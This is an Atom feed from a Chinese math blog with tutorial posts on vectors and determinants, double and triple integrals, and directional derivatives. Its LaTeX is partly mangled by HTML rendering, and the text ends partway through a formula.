<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ascotbe</title>
  
  
  <link href="https://www.ascotbe.com/atom.xml" rel="self"/>
  
  <link href="https://www.ascotbe.com/"/>
  <updated>2023-09-27T09:53:06.426Z</updated>
  <id>https://www.ascotbe.com/</id>
  
  <author>
    <name>ascotbe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>向量与行列式</title>
    <link href="https://www.ascotbe.com/2023/09/25/LinearAlgebra_0x01/"/>
    <id>https://www.ascotbe.com/2023/09/25/LinearAlgebra_0x01/</id>
    <published>2023-09-25T15:58:53.000Z</published>
    <updated>2023-09-27T09:53:06.426Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/0_1.jpg" alt=""></p><h2 id="向量"><a href="#向量" class="headerlink" title="向量"></a>向量</h2><h3 id="向量的定义"><a href="#向量的定义" class="headerlink" title="向量的定义"></a>向量的定义</h3><p>$n$个有序的数$a<em>{1},a</em>{2},\ldots,a<em>{n}$所组成的数组称为$n$维向量，这$n$个数称为该向量的$n$个分量，第$i$个数$a</em>{i}$称为第$i$个分量。$n$维向量可写成一行，也可写成一列。$n$也称为该向量的维数。分别称为行向量和列向量:</p><ul><li><p>$n$维列向量：</p><p>$\left(\begin{array}{c}a<em>{1}\a</em>{2}\\vdots\a_{n}\end{array}\right)$</p></li><li><p>$n$维行向量：</p><p>$\left(a<em>{1},a</em>{2},\ldots,a<em>{n}\right)\text{或}\left(\begin{array}{llll}a</em>{1}&amp;a<em>{2}&amp;\cdots&amp;a</em>{n}\end{array}\right)$</p></li></ul><h4 id="二维向量"><a href="#二维向量" class="headerlink" title="二维向量"></a>二维向量</h4><p>2维向量$\boldsymbol{u}=\left(\begin{array}{l}u<em>{1}\u</em>{2}\end{array}\right)$其实就是直角坐标系中的一个点；也可以认为它是原点指向$\left(\begin{array}{l}u<em>{1}\u</em>{2}\end{array}\right)$的有向线段。这两种几何意义是完全等效的，在本文档中会混用这两者:</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/1.svg" alt="image-20230926173237446"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/2.svg" alt="image-20230926173248942"></p><p>所以可认为直角坐标系中的任意点都是向量，也可以认为原点指向某点的有向线段都是向量：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/3.gif" alt=""></p><h4 id="三维向量"><a href="#三维向量" class="headerlink" title="三维向量"></a>三维向量</h4><p>3 维向量也是一样的，比如上一节提到的篮球，它作为三维空间中一个点，本身就是向量；也可以认为原点指向它的有向线段是向量：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/4.png" alt="image-20230926173721977"></p><h4 id="N维向量"><a href="#N维向量" class="headerlink" title="N维向量"></a>N维向量</h4><p>对于更高维的向量，比如想描述一个游戏人物的信息：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/5.png" alt="image-20230926173758510"></p><p>就可以用9维列向量或行向量来表示，但就没有什么几何意义了：</p><p>$\begin{pmatrix}16\8\9\19\15\10\end{pmatrix}$ 或$(16, 8, 9, 19, 15, 10)$</p><h4 id="相等的向量"><a href="#相等的向量" class="headerlink" title="相等的向量"></a>相等的向量</h4><p>如果两个向量的维数相同，且各个分量相等，那么这两个向量相等。比如：</p><p>$\begin{pmatrix}1\2\end{pmatrix}=\begin{pmatrix}1\2\end{pmatrix},\quad\begin{pmatrix}1\2\end{pmatrix}\ne\begin{pmatrix}2\4\end{pmatrix}$</p><p>不区分列向量和行向量的话，下面两个向量也是相等的：</p><p>$\begin{pmatrix}1\2\end{pmatrix}=(1,2)$</p><h4 id="零向量"><a href="#零向量" class="headerlink" title="零向量"></a>零向量</h4><p>如果$n$维向量的所有分量都是0，那么就被称为零向量。比如：</p><p>2 维零向量：$\boldsymbol{0}=\begin{pmatrix}0\0\end{pmatrix}$</p><p>3 维零向量：$\boldsymbol{0}=\begin{pmatrix}0\0\0\end{pmatrix}$</p><p>上面两个向量的几何意义就是平面、空间中的原点，或者认为是起点和终点相同的有向线段：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/8.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/9.png" alt=""></p><p>零向量非常特殊：</p><ul><li>长度：零向量的长度为0</li><li>方向：零向量指向任意方向</li><li>夹角：因为零向量指向任意方向，所以它与某一向量的夹角为任意角度</li><li>平行与正交：因为夹角任意，所以零向量与任意向量平行、正交</li></ul><h2 id="行列式"><a href="#行列式" class="headerlink" title="行列式"></a>行列式</h2><h3 id="行列式的本质定义"><a href="#行列式的本质定义" class="headerlink" title="行列式的本质定义"></a>行列式的本质定义</h3><p>一个2阶行列式的计算是这样的：$\left|\begin{array}{ll}a<em>{11}&amp;a</em>{12}\a<em>{21}&amp;a</em>{22}\end{array}\right|=a<em>{11}a</em>{22}-a<em>{12}a</em>{21}$。这是一个什么样的计算规则？它背后有什么样的意义？</p><p>首先我们设$\vec a_1$的长度（模）为$l$，$\vec a_2$的长度（模）为$m$，$\vec a_1$与$x$轴正向的夹角为$\alpha$，$\vec a_2$与$x$轴正向的夹角为$\beta$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/6.png" alt="image-20230925193756478" style="zoom:50%;" /></p><p>通过上图我们可以推导出如下公式</p><p>$\begin{align}S<em>{\square O A B C} &amp; =l \cdot m \cdot \sin (\beta-\alpha) \&amp; =l \cdot m(\sin \beta \cos \alpha-\cos \beta \sin \alpha) \&amp; =l \cos \alpha \cdot m \sin \beta-l \sin \alpha \cdot m \cos \beta \&amp; =a</em>{11} a<em>{22}-a</em>{12} a_{21}\end{align}$</p><p>于是根据上面公式我们可以得出</p><p>$\begin{align}\left|\begin{array}{ll}a<em>{11} &amp; a</em>{12} \a<em>{21} &amp; a</em>{22}\end{array}\right|=a<em>{11} a</em>{22}-a<em>{12} a</em>{21}=S_{\square O A B C}\end{align}$</p><p>我们看到了一个极其直观有趣的结论：<strong>2阶行列式是由两个2维向量组成的，其(运算规则的)结果为以这两个向量为邻边的平行四边形的面积</strong>。这不仅得出了2阶行列式的计算规则，也能够清楚地看到其几何意义。</p><p>3阶行列式$D<em>{3}=\left|\begin{array}{lll}a</em>{11}&amp;a<em>{12}&amp;a</em>{13}\a<em>{21}&amp;a</em>{22}&amp;a<em>{23}\a</em>{31}&amp;a<em>{32}&amp;a</em>{33}\end{array}\right|$是由<strong>三个3维向量$\boldsymbol{\alpha}<em>{1}=\left[a</em>{11},a<em>{12},a</em>{13}\right],\boldsymbol{\alpha}<em>{2}=\left[a</em>{21},a<em>{22},a</em>{23}\right],\boldsymbol{\alpha}<em>{3}=\left[a</em>{31},a<em>{32},a</em>{33}\right]$组成的，其结果为以这三个向量为邻边的平行六面体的体积</strong>。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/7.png" alt="image-20230926171557984" style="zoom:50%;" /></p><p>依此类推，我们便可以给出$n$阶行列式$D<em>{n}=\left|\begin{array}{ccc}a</em>{11}&amp;\cdots&amp;a<em>{1n}\\vdots&amp;&amp;\vdots\a</em>{n1}&amp;\cdots&amp;a<em>{mn}\end{array}\right|$的本质定义：**$n$阶行列式是由$n$个$n$维向量$\boldsymbol{\alpha}</em>{1}=\left[a<em>{11},a</em>{12},\cdots,a<em>{1n}\right],\boldsymbol{\alpha}</em>{2}=\left[a<em>{21},a</em>{22},\cdots,a<em>{2n}\right],\cdots,\boldsymbol{\alpha}</em>{n}=\left[a<em>{n1},a</em>{n2},\cdots,a_{nn}\right]$组成的，其(运算规则的)结果为以这$n$个向量为邻边的$n$维图形的体积**。</p><h3 id="线性相关与线性无关"><a href="#线性相关与线性无关" class="headerlink" title="线性相关与线性无关"></a>线性相关与线性无关</h3><p>以3阶行列式为例，若$D<em>{3}\neq0$，则意味着体积不为0，则称组成该行列式的三个向量线性无关；若$D</em>{3}=0$，则称线性相关。</p><h4 id="线性无关"><a href="#线性无关" class="headerlink" title="线性无关"></a>线性无关</h4><p>RGB称为三原色，意思就是这三种颜色是最基本的颜色，缺一不可：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/10.png" alt=""></p><p>上述三个颜色中的任意一种都不可能被另外两种颜色混合出来，假如用向量来表示这三种颜色：</p><p>$\boldsymbol{R}=\begin{pmatrix}255\0\0\end{pmatrix},\quad \boldsymbol{G}=\begin{pmatrix}0\255\0\end{pmatrix},\quad \boldsymbol{B}=\begin{pmatrix}0\0\255\end{pmatrix}$</p><p>可以说这三者组成的向量组：</p><p>$\mathcal{A}={\boldsymbol{R},\boldsymbol{G},\boldsymbol{B}}$</p><p>是线性无关的。因此三原色是线性无关在美术中的一个例子。</p><h4 id="线性相关"><a href="#线性相关" class="headerlink" title="线性相关"></a>线性相关</h4><p>海棠红可以通过三原色混合得到：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/11.png" alt=""></p><p>或者说海棠红可以通过RGB线性组合得到：</p><p>海棠红=$R+\frac{52}{255}G+\frac{85}{255}B$</p><p>那么下面这个向量组：</p><p>$\mathcal{A}={\boldsymbol{R},\boldsymbol{G},\boldsymbol{B},$海棠红$}$</p><p>就是线性相关的。这就是线性相关在美术中的一个例子。</p><h4 id="几何上面的例子"><a href="#几何上面的例子" class="headerlink" title="几何上面的例子"></a>几何上面的例子</h4><p>通俗的说，线性相关是指两个向量从同一个起点出发，同方向或者反方向的前进组成的，如果是在二维中两向量无法组成一个平面，三维中三个向量无法组成一个空间。下图为线性相关$\boldsymbol{v_1}$和$\boldsymbol{v_2}$可以互相线性表示</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/12.png" alt="image-20230927134800112"></p><p>下图为线性无关，$\boldsymbol{v_3}$和$\boldsymbol{v_4}$不能互相线性表示</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/LinearAlgebra/13.png" alt="image-20230927134903040"></p><h3 id="行列式的性质"><a href="#行列式的性质" class="headerlink" title="行列式的性质"></a>行列式的性质</h3><p><mark class="hl-label green">性质1</mark> 行列互换，其值不变，即$|\boldsymbol{A}|=\left|\boldsymbol{A}^{\mathrm{T}}\right|$</p><p><mark class="hl-label green">性质2</mark> 若行列式中某行(列)元素全为零，则行列式为零。</p><p><mark class="hl-label green">性质3</mark> 若行列式中某行(列)元素有公因子$k(k\neq0)$，则k可提到行列式外面，即</p><p>$\left|\begin{array}{cccc}<br>a<em>{11} &amp; a</em>{12} &amp; \cdots &amp; a<em>{1 n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>k a</em>{i 1} &amp; k a<em>{i 2} &amp; \cdots &amp; k a</em>{i n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>a<em>{n 1} &amp; a</em>{n 2} &amp; \cdots &amp; a<em>{m}<br>\end{array}\right|=k\left|\begin{array}{cccc}<br>a</em>{11} &amp; a<em>{12} &amp; \cdots &amp; a</em>{1 n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>a<em>{i 1} &amp; a</em>{i 2} &amp; \cdots &amp; a<em>{i n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>a</em>{n 1} &amp; a<em>{n 2} &amp; \cdots &amp; a</em>{m}<br>\end{array}\right|$</p><p><mark class="hl-label green">性质4</mark> 行列式中某行(列)元素均是两个元素之和，则可拆成两个行列式之和，即</p><p>$\left|\begin{array}{cccc}<br>a<em>{11} &amp; a</em>{12} &amp; \cdots &amp; a<em>{1 n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>a</em>{i 1}+b<em>{i 1} &amp; a</em>{i 2}+b<em>{i 2} &amp; \cdots &amp; a</em>{i n}+b<em>{i n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>a</em>{n 1} &amp; a<em>{n 2} &amp; \cdots &amp; a</em>{m n}<br>\end{array}\right|=\left|\begin{array}{cccc}<br>a<em>{11} &amp; a</em>{12} &amp; \cdots &amp; a<em>{1 n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>a</em>{i 1} &amp; a<em>{i 2} &amp; \cdots &amp; a</em>{i n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>a<em>{n 1} &amp; a</em>{n 2} &amp; \cdots &amp; a<em>{m n}<br>\end{array}\right|+\left|\begin{array}{cccc}<br>a</em>{11} &amp; a<em>{12} &amp; \cdots &amp; a</em>{1 n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>b<em>{i 1} &amp; b</em>{i 2} &amp; \cdots &amp; b<em>{i n} \<br>\vdots &amp; \vdots &amp; &amp; \vdots \<br>a</em>{n 1} &amp; a<em>{n 2} &amp; \cdots &amp; a</em>{m}<br>\end{array}\right|$</p><p><mark class="hl-label green">性质5</mark> 行列式中两行(列)互换，行列式的值反号。</p><p><mark class="hl-label green">性质6</mark> 行列式中的两行(列)元素相等或对应成比例，则行列式为零。</p><p><mark class="hl-label green">性质7</mark> 行列式中某行(列)的k倍加到另一行(列)，行列式的值不变。</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="线性代数" scheme="https://www.ascotbe.com/categories/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/"/>
    
    
    <category term="线代" scheme="https://www.ascotbe.com/tags/%E7%BA%BF%E4%BB%A3/"/>
    
  </entry>
  
  <entry>
    <title>重积分</title>
    <link href="https://www.ascotbe.com/2023/09/11/FurtherMathematics_0x11/"/>
    <id>https://www.ascotbe.com/2023/09/11/FurtherMathematics_0x11/</id>
    <published>2023-09-11T15:58:53.000Z</published>
    <updated>2023-09-20T09:45:43.631Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_11.gif" alt="0_11"></p><h2 id="二重积分概念与性质"><a href="#二重积分概念与性质" class="headerlink" title="二重积分概念与性质"></a>二重积分概念与性质</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><mark class="hl-label green">定义</mark>     设函数$z=f(x,y)$在有界闭区域$D$上有定义，将区域$D$任意分成$n$个小闭区域</p><p>$\begin{align}\Delta\sigma<em>{1},\Delta\sigma</em>{2},\cdots,\Delta\sigma_{n}\end{align}$</p><p>其中$\Delta\sigma<em>{i}$表示第$i$个小区域，也表示它的面积。在每个$\Delta\sigma</em>{i}$上任取一点$\left(\xi<em>{i},\eta</em>{i}\right)$，作乘积$f\left(\xi<em>{i},\eta</em>{i}\right)\Delta\sigma<em>{i}$，并求和$\sum</em>{i=1}^{n}f\left(\xi<em>{i},\eta</em>{i}\right)\Delta\sigma<em>{i}$，记$\lambda$为$n$个小区域$\Delta\sigma</em>{1},\Delta\sigma<em>{2},\cdots,\Delta\sigma</em>{n}$中的最大直径，如果$\lim<em>{\lambda\rightarrow0}\sum</em>{i=1}^{n}f\left(\xi<em>{i},\eta</em>{i}\right)\Delta\sigma_{i}$存在，则称此极限值为函数$f(x,y)$在区域$D$上的<strong>二重积分</strong>，记为</p><p>$\begin{align}\iint<em>{D}f(x,y)\mathrm{d}\sigma=\lim</em>{\lambda\rightarrow0}\sum<em>{i=1}^{n}f\left(\xi</em>{i},\eta<em>{i}\right)\Delta\sigma</em>{i}\end{align}$</p><h4 id="形象的比喻"><a href="#形象的比喻" class="headerlink" title="形象的比喻"></a>形象的比喻</h4><p>可以参考知乎的这篇文章：<a href="https://www.zhihu.com/question/44875342">二重积分到底该怎么理解？</a></p><h4 id="几何意义"><a href="#几何意义" class="headerlink" title="几何意义"></a>几何意义</h4><p>二重积分$\iint_{D}f(x,y)\mathrm{d}\sigma$是一个数。当$f(x,y)\geqslant0$时，其值等于以区域$D$为底，以曲面$z=f(x,y)$为曲顶的曲顶柱体的体积；当$f(x,y)\leqslant0$时，二重积分的值为负值，其绝对值等于上述曲顶柱体的体积。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/103.png" alt="103"></p><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ul><li><p>（求区域面积）$\iint<em>{D}1\cdot\mathrm{d}\sigma=\iint</em>{D}\mathrm{~d}\sigma=A$，其中$A$为$D$的面积。</p></li><li><p>（可积函数必有界）当$f(x,y)$在有界闭区域$D$上可积时，$f(x,y)$在$D$上必有界。</p></li><li><p>（积分的线性性质）设$k<em>{1}$，$k</em>{2}$为常数，则$\begin{align}\iint<em>{D}\left[k</em>{1}f(x,y)\pm k<em>{2}g(x,y)\right]\mathrm{d}\sigma=k</em>{1}\iint<em>{D}f(x,y)\mathrm{d}\sigma\pm k</em>{2}\iint_{D}g(x,y)\mathrm{d}\sigma\end{align}$</p></li><li><p>（积分的可加性）设$f(x,y)$在有界闭区域$D$上可积，且$D<em>{1}\cup D</em>{2}=D,D<em>{1}\cap D</em>{2}=\varnothing$，则$\begin{align}\iint<em>{D}f(x,y)\mathrm{d}\sigma=\iint</em>{D<em>{1}}f(x,y)\mathrm{d}\sigma+\iint</em>{D_{2}}f(x,y)\mathrm{d}\sigma\end{align}$</p></li><li><p>（积分的保号性）当$f(x,y),g(x,y)$在有界闭区域$D$上可积时，若在$D$上$f(x,y)\leqslant g(x,y)$则有$\begin{align}\iint<em>{D}f(x,y)\mathrm{d}\sigma\leqslant\iint</em>{D}g(x,y)\mathrm{d}\sigma\end{align}$</p><p>特殊地，有$\begin{align}\left|\iint<em>{D}f(x,y)\mathrm{d}\sigma\right|\leqslant\iint</em>{D}|f(x,y)|\mathrm{d}\sigma\end{align}$</p></li><li><p>（二重积分的估值定理）设$M,m$分别是$f(x,y)$在有界闭区域$D$上的最大值和最小值，$A$为$D$的面积，则有$\begin{align}mA\leqslant\iint_{D}f(x,y)\mathrm{d}\sigma\leqslant MA\end{align}$</p></li><li><p>（二重积分的中值定理）设函数$f(x,y)$在有界闭区域$D$上连续，$A$为$D$的面积，则在$D$上至少存在一点$(\xi,\eta)$，使得$\begin{align}\iint_{D}f(x,y)\mathrm{d}\sigma=f(\xi,\eta)A\end{align}$</p></li></ul><h2 id="二重积分的计算"><a href="#二重积分的计算" class="headerlink" title="二重积分的计算"></a>二重积分的计算</h2><h3 id="利用直角坐标计算"><a href="#利用直角坐标计算" class="headerlink" title="利用直角坐标计算"></a>利用直角坐标计算</h3><ul><li>先$y$后$x$</li></ul><p>$\begin{align}\iint<em>{D}f(x,y)\mathrm{d}\sigma=\int</em>{a}^{b}\mathrm{~d}x\int<em>{\varphi</em>{1}(x)}^{\varphi_{2}(x)}f(x,y)\mathrm{d}y\end{align}$</p><ul><li>先$x$后$y$</li></ul><p>$\begin{align}\iint<em>{D}f(x,y)\mathrm{d}\sigma=\int</em>{c}^{d}\mathrm{~d}y\int<em>{\psi</em>{1}(y)}^{\psi_{2}(y)}f(x,y)\mathrm{d}x\end{align}$</p><h3 id="利用极坐标计算"><a href="#利用极坐标计算" class="headerlink" title="利用极坐标计算"></a>利用极坐标计算</h3><ul><li>先$\rho$后$\theta$</li></ul><p>$\begin{align}\iint<em>{D}f(x,y)\mathrm{d}\sigma=\int</em>{\alpha}^{\beta}\mathrm{d}\theta\int<em>{\varphi</em>{1}(\theta)}^{\varphi_{2}(\theta)}f(\rho\cos\theta,\rho\sin\theta)\rho\mathrm{d}\rho\end{align}$</p><p>【注】 适合用极坐标计算的二重积分的特征：</p><ol><li>适合用极坐标计算的被积函数：$f\left(\sqrt{x^{2}+y^{2}}\right),f\left(\frac{y}{x}\right),f\left(\frac{x}{y}\right)$</li><li>适合用极坐标的积分域：如$x^{2}+y^{2}\leqslant R^{2};r^{2}\leqslant x^{2}+y^{2}\leqslant R^{2};x^{2}+y^{2}\leqslant2ax;x^{2}+y^{2}\leqslant2bx$</li></ol><h3 id="利用函数的奇偶性计算"><a href="#利用函数的奇偶性计算" class="headerlink" title="利用函数的奇偶性计算"></a>利用函数的奇偶性计算</h3><ul><li>若积分域$D$关于$y$轴对称，$f(x,y)$关于$x$有奇偶性，则：</li></ul><p>$\iint<em>{D}f(x,y)\mathrm{d}\sigma=\left{\begin{array}{ll}2\iint</em>{D_{x\geqslant0}}f(x,y)\mathrm{d}\sigma,&amp;f(x,y)\text{关于}x\text{为偶函数}\0,&amp;f(x,y)\text{关于}x\text{为奇函数}\end{array}\right.$</p><ul><li>若积分域$D$关于$x$轴对称，$f(x,y)$关于$y$有奇偶性，则</li></ul><p>$\iint<em>{D}f(x,y)\mathrm{d}\sigma=\left{\begin{array}{ll}2\iint</em>{D_{y\geqslant0}}f(x,y)\mathrm{d}\sigma,&amp;f(x,y)\text{关于}y\text{为偶函数}\0,&amp;f(x,y)\text{关于}y\text{为奇函数}\end{array}\right.$</p><h3 id="利用变量的轮换对称性计算"><a href="#利用变量的轮换对称性计算" class="headerlink" title="利用变量的轮换对称性计算"></a>利用变量的轮换对称性计算</h3><p>如果积分域$D$具有轮换对称性，也就是关于直线$y=x$对称，即$D$的表达式中将$x$换作$y$，$y$换作$x$表达式不变，则</p><p>$\iint<em>{D}f(x,y)\mathrm{d}\sigma=\iint</em>{D}f(y,x)\mathrm{d}\sigma$</p><h2 id="三重积分"><a href="#三重积分" class="headerlink" title="三重积分"></a>三重积分</h2><p>设区域$E$可以表示为：</p><p>$E=\left{(x,y,z)\mid a\leq x \leq b,g<em>{1}(x)\leq y\leq g</em>{2}(x),u<em>{1}(x,y)\leq z\leq u</em>{2}(x,y)\right}$</p><p>那么通过富比尼定理，函数$f(x,y,z)$在区域$E$上的三重积分可以如下计算：</p><p>$\begin{aligned}\iiint<em>{E}f(x,y,z)\mathrm{d}V&amp;=\iint</em>{D}\left[\int<em>{u</em>{1}(x,y)}^{u<em>{2}(x,y)}f(x,y,z)\mathrm{d}z\right]\mathrm{d}A\&amp;=\int</em>{a}^{b}\int<em>{g</em>{1}(x)}^{g<em>{2}(x)}\int</em>{u<em>{1}(x,y)}^{u</em>{2}(x,y)}f(x,y,z)\mathrm{d}z\mathrm{~d}y\mathrm{~d}x\end{aligned}$</p><p>这样就将三重积分划为了方便计算的三次积分。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/104.jpeg" alt="104"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>方向导数、梯度与多元函数的极致与最值</title>
    <link href="https://www.ascotbe.com/2023/07/25/FurtherMathematics_0x10/"/>
    <id>https://www.ascotbe.com/2023/07/25/FurtherMathematics_0x10/</id>
    <published>2023-07-25T15:58:53.000Z</published>
    <updated>2023-09-12T05:17:53.642Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_10.jpg" alt="f7c1af15eca6ff27911d82bb9cb5fd5e" style="zoom:25%;" /></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h4 id="偏导数"><a href="#偏导数" class="headerlink" title="偏导数"></a>偏导数</h4><p>函数沿坐标轴方向的变化率</p><p>$\begin{align}<br>f<em>{x}\left(x</em>{0}, y<em>{0}\right) &amp; = \lim </em>{\Delta x \rightarrow 0} \frac{f\left(x<em>{0}+\Delta x, y</em>{0}\right)-f\left(x<em>{0}, y</em>{0}\right)}{\Delta x} \<br>f<em>{y}\left(x</em>{0}, y<em>{0}\right) &amp; = \lim </em>{\Delta y \rightarrow 0} \frac{f\left(x<em>{0}, y</em>{0}+\Delta y\right)-f\left(x<em>{0}, y</em>{0}\right)}{\Delta y}<br>\end{align}$</p><h4 id="方向余弦"><a href="#方向余弦" class="headerlink" title="方向余弦"></a>方向余弦</h4><p>$\vec{l}=(a, b)$</p><p>单位化</p><p>$\begin{align}<br>\vec{l} &amp; =\frac{1}{\sqrt{a^{2}+b^{2}}}(a, b) \<br>&amp;=  \left(\frac{a}{\sqrt{a^{2}+b^{2}}}, \frac{b}{\sqrt{a^{2}+b^{2}}}\right) \<br>&amp; =(\cos \alpha, \cos \beta)<br>\end{align}$</p><h2 id="方向导数"><a href="#方向导数" class="headerlink" title="方向导数"></a>方向导数</h2><h3 id="对于二元函数（平面）"><a href="#对于二元函数（平面）" class="headerlink" title="对于二元函数（平面）"></a>对于二元函数（平面）</h3><p>设$l$是$xOy$平面上以$P<em>{0}\left(x</em>{0},y<em>{0}\right)$为始点的一条射线，$\boldsymbol{e}</em>{l}=(\cos\alpha,\cos\beta)$是与$l$同方向的单位向量，射线$\vec{l}$的参数方程为</p><p>$\begin{align}\left{\begin{array}{l}x=x<em>{0}+t\cos\alpha\y=y</em>{0}+t\cos\beta\end{array}(t\geqslant0)\right.\end{align}$</p><p>定理：如果函数$f(x,y)$在点$P<em>{0}\left(x</em>{0},y_{0}\right)$可微分，那么函数在该点沿任一方向l的方向导数存在，且有</p><p>$\begin{align}\left.\frac{\partial f}{\partial l}\right|<em>{\left(x</em>{0},y<em>{0}\right)}=f</em>{x}\left(x<em>{0},y</em>{0}\right)\cos\alpha+f<em>{y}\left(x</em>{0},y_{0}\right)\cos\beta\end{align}$</p><p>其中$\cos\alpha$和$\cos\beta$是方向$\vec{l}$的方向余弦，公式如下</p><p>$\begin{align}<br>\vec{l} &amp; =\frac{1}{\sqrt{a^{2}+b^{2}}}(a, b) \<br>&amp;=  \left(\frac{a}{\sqrt{a^{2}+b^{2}}}, \frac{b}{\sqrt{a^{2}+b^{2}}}\right) \<br>&amp; =(\cos \alpha, \cos \beta)<br>\end{align}$</p><p>如下图所示，点$p$位置处红色箭头方向的方向导数为黑色切线的斜率，来自链接<a href="https://www.geogebra.org/m/Bx8nFMNc">Directional Derivative</a>  <a href="https://github.com/Ascotbe/Image/blob/master/FurtherMathematics/material-ZC4TsVYY.ggb">文件备份</a></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/98.png" alt="image-20230830152016791"></p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>求函数$z=x\mathrm{e}^{2y}$在点$P(1,0)$处沿从点$P(1,0)$到点$Q(2,-1)$的方向的方向导数</p><p>这里方向$\vec{l}$即向量$\overrightarrow{PQ}=(1,-1)$的方向，与$\vec{l}$同向的单位向量为$\vec{\boldsymbol{e}}_{l}=\left(\frac{1}{\sqrt{2}},-\frac{1}{\sqrt{2}}\right)$</p><p>因为函数可微分</p><p>$\begin{align}\left.\frac{\partial z}{\partial x}\right|<em>{(1,0)}=\left.\mathrm{e}^{2y}\right|</em>{(1,0)}=1,\left.\frac{\partial z}{\partial y}\right|<em>{(1,0)}=\left.2x\mathrm{e}^{2y}\right|</em>{(1,0)}=2\end{align}$</p><p>故所求方向导数为</p><p>$\begin{align}\left.\frac{\partial z}{\partial l}\right|_{(1,0)}=1\cdot\frac{1}{\sqrt{2}}+2\cdot\left(-\frac{1}{\sqrt{2}}\right)=-\frac{\sqrt{2}}{2}\end{align}$</p><hr><h3 id="对于三元函数（空间）"><a href="#对于三元函数（空间）" class="headerlink" title="对于三元函数（空间）"></a>对于三元函数（空间）</h3><p>对于三元函数$f(x,y,z)$来说,它在空间一点$P<em>{0}\left(x</em>{0},y<em>{0},z</em>{0}\right)$沿方向$\vec{\boldsymbol{e}}_{l}=(\cos\alpha,\cos\beta,\cos\gamma)$的方向导数为</p><p>$\begin{align}\left.\frac{\partial f}{\partial l}\right|<em>{\left(x</em>{0},y<em>{0},z</em>{0}\right)}=\lim<em>{t\rightarrow0^{+}}\frac{f\left(x</em>{0}+t\cos\alpha,y<em>{0}+t\cos\beta,z</em>{0}+t\cos\gamma\right)-f\left(x<em>{0},y</em>{0},z_{0}\right)}{t}\end{align}$</p><p>同样可以证明:如果函数$f(x,y,z)$在点$\left(x<em>{0},y</em>{0},z<em>{0}\right)$可微分,那么函数在该点沿着方向$\vec{\boldsymbol{e}}</em>{l}=(\cos\alpha,\cos\beta,\cos\gamma)$的方向导数为</p><p>$\begin{align}\left.\frac{\partial f}{\partial l}\right|<em>{\left(x</em>{0},y<em>{0},z</em>{0}\right)}=f<em>{x}\left(x</em>{0},y<em>{0},z</em>{0}\right)\cos\alpha+f<em>{y}\left(x</em>{0},y<em>{0},z</em>{0}\right)\cos\beta+f<em>{z}\left(x</em>{0},y<em>{0},z</em>{0}\right)\cos\gamma\end{align}$</p><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p>求$f(x,y,z)=xy+yz+zx$在点$(1,1,2)$沿方向$l$的方向导数，其中$\vec{l}$的方向角分别为$60^{\circ},45^{\circ},60^{\circ}$</p><p>解与$\vec{l}$同向的单位向量</p><p>$\begin{align}\vec{\boldsymbol{e}}_{l}=\left(\cos60^{\circ},\cos45^{\circ},\cos60^{\circ}\right)=\left(\frac{1}{2},\frac{\sqrt{2}}{2},\frac{1}{2}\right)\end{align}$</p><p>因为函数可微分，且</p><p>$\begin{align}<br>f<em>{x}(1,1,2)=\left.(y+z)\right|</em>{(1,1,2)}=3\<br>f<em>{y}(1,1,2)=\left.(x+z)\right|</em>{(1,1,2)}=3\<br>f<em>{z}(1,1,2)=\left.(y+x)\right|</em>{(1,1,2)}=2<br>\end{align}$</p><p>由公式得</p><p>$\begin{align}\left.\frac{\partial f}{\partial 